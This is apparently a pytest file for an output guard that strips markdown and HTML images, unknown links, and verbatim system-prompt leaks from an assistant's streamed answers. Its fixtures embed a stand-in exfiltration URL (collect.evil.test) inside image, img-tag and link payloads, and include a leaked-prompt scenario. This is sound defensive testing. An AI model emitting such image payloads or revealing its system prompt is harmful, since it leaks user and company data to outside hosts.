"""The output guard: model text is made safe to render before anyone sees it, streamed or not."""

from __future__ import annotations

import pytest

from hackstack.agent.guard import (
    IMAGE_PLACEHOLDER,
    LEAK_NOTICE,
    OutputGuard,
    guard_text,
    sanitize_markdown,
)

EVIL = "https://collect.evil.test/log?d=Five%20days%20carry%20over"
SYSTEM = (
    "You are Northwind Brain, the internal assistant of Northwind Labs, a remote-first company of "
    "about 60 people that makes Pulse. How to answer: Search before you answer. Use several "
    "searches when a question has more than one part. Never guess a policy, a number or a date. "
    "Keep answers short: lead with the answer, then the detail."
)


def streamed(text: str, step: int = 1, **kw) -> str:
    """``text`` fed to an OutputGuard ``step`` characters at a time."""
    g = OutputGuard(**kw)
    out = [g.feed(text[i : i + step]) for i in range(0, len(text), step)]
    out.append(g.finish())
    return "".join(out)


# --- markdown: images, html, links -------------------------------------------------------------


def test_inline_image_is_removed():
    out = sanitize_markdown(f"Five days carry over [1].\n\n![status]({EVIL})")
    assert "collect.evil.test" not in out
    assert IMAGE_PLACEHOLDER in out
    assert out.startswith("Five days carry over [1].")


def test_reference_style_image_and_its_definition_are_removed():
    out = sanitize_markdown(f"ok ![s][r]\n\n[r]: {EVIL}\n")
    assert "collect.evil.test" not in out
    assert "![" not in out


def test_html_media_tags_are_removed():
    html = f'ok <img src="{EVIL}"> and <IMG SRC={EVIL} /> <iframe src="x"></iframe>'
    out = sanitize_markdown(html)
    assert "<img" not in out.lower()
    assert "<iframe" not in out.lower()
    assert "collect.evil.test" not in out


def test_unknown_link_keeps_only_its_label():
    assert sanitize_markdown(f"see [the policy]({EVIL}) now") == "see the policy now"


def test_link_to_a_shown_source_is_kept():
    url = "https://github.com/northwind/pulse/blob/main/README.md"
    assert sanitize_markdown(f"[README]({url})", allowed={url}) == f"[README]({url})"


def test_image_inside_a_link_is_removed_too():
    out = sanitize_markdown(f"[![x]({EVIL})]({EVIL})")
    assert "collect.evil.test" not in out


@pytest.mark.parametrize(
    "text",
    [
        "Five days carry over [1].",
        "Both [1][2] say so, and [3, 4] agree.",
        "A list:\n- one [1]\n- two [2]",
        "Use `x[0]` and **bold** text.",
        "a < b and b > c",
    ],
)
def test_ordinary_answers_are_untouched(text):
    assert sanitize_markdown(text) == text
    assert streamed(text) == text


# --- streaming --------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "text",
    [
        f"Five days [1].\n\n![status]({EVIL})",
        f"Start ![a](https://x.test/a.png) mid [link]({EVIL}) end [2]",
        f'Tag <img src="{EVIL}"> after',
        f"Ref ![s][r]\n\n[r]: {EVIL}\nmore",
        "Cites [1] and [2]",
        "Ends with a bang!",
        "Unclosed [bracket and more text",
    ],
)
@pytest.mark.parametrize("step", [1, 3, 7, 1000])
def test_streaming_matches_the_whole_text(text, step):
    assert streamed(text, step) == guard_text(text)


def test_no_streamed_piece_ever_carries_the_exfil_url():
    text = f"Summary here [1].\n![status]({EVIL})"
    g = OutputGuard()
    pieces = [g.feed(ch) for ch in text] + [g.finish()]
    assert "collect.evil.test" not in "".join(pieces)


def test_a_dangling_image_cut_off_by_max_tokens_is_dropped():
    out = streamed("Answer [1]. ![status](https://collect.evil.test/log?d=Answ")
    assert "collect.evil.test" not in out
    assert out.startswith("Answer [1].")


def test_text_is_released_while_streaming_not_only_at_the_end():
    g = OutputGuard()
    early = g.feed("Five days carry over into the next year, as the handbook says. ")
    assert early  # most of it comes out straight away
    assert early + g.feed("More.") + g.finish() == (
        "Five days carry over into the next year, as the handbook says. More."
    )


# --- system prompt leaks ----------------------------------------------------------------------


def test_verbatim_system_prompt_is_redacted():
    out = streamed(f"Sure, here it is:\n```\n{SYSTEM}\n```", system=SYSTEM)
    assert "remote-first company of about" not in out
    assert "Search before you answer" not in out
    assert "Never guess a policy" not in out
    assert LEAK_NOTICE in out
    assert out.startswith("Sure, here it is:")


@pytest.mark.parametrize("step", [1, 5, 10000])
def test_no_streamed_piece_carries_the_prompt(step):
    g = OutputGuard(system=SYSTEM)
    text = f"Here: {SYSTEM}"
    pieces = [g.feed(text[i : i + step]) for i in range(0, len(text), step)] + [g.finish()]
    joined = "".join(pieces)
    assert "Northwind Brain, the internal assistant" not in joined
    assert g.leaked


def test_short_phrases_shared_with_the_prompt_are_fine():
    text = "I searched before I answered. Never guess a policy: the handbook says five days [1]."
    assert streamed(text, system=SYSTEM) == text


def test_text_that_is_also_in_a_shown_passage_is_not_a_leak():
    passage = "Northwind Labs, a remote-first company of about 60 people that makes Pulse."
    text = "Northwind Labs is a remote-first company of about 60 people that makes Pulse [1]."
    assert streamed(text, system=SYSTEM, passages=lambda: [passage]) == text


def test_guard_text_without_a_system_prompt_only_sanitises():
    assert guard_text(SYSTEM) == SYSTEM
